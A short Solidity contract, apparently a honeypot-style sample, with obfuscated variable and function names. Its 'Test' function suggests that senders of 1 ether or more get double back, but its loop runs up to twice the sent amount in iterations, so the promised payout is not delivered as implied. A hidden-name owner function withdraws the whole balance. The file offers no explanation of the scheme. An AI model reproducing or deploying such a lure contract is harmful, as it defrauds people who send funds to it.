// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Test1
{
    address _0x9181c3 = msg.sender;

    function _0xea4648()
    payable
    public
    {
        require(msg.sender==_0x9181c3);
        _0x9181c3.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var _0xf02f5d = 1;
            var _0xba17f2 = 0;
            var _0x885758 = msg.value*2;

            while(true)
            {
                if(_0xf02f5d<_0xba17f2)break;
                if(_0xf02f5d>_0x885758)break;

                _0xba17f2=_0xf02f5d;
                _0xf02f5d++;
            }
            msg.sender.transfer(_0xba17f2);
        }
    }
}